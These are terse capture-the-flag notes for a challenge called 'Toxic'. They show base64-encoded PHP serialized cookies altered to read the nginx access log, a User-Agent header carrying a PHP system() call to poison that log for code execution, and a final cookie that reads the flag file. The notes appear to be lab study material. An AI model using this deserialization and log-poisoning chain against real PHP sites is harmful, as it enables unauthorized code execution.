# Toxic - 
```bash
# catch request with burp
```
```bash
decode Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9 with base64
obtain O:9:"PageModel":1:{s:4:"file" s:15:"/www/index.html";}
```
```bash
encode O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
obtain Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
```
```bash
# send to repeater

```
```bash
change User-Agent
User-Agent: <?php system('ls') ?>
```
```bash
 encode O:9:"PageModel":1:{s:4:"file";s:11:"/flag_fCdOK";} with base64
obtain Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2ZsYWdfZkNkT0siO30
```

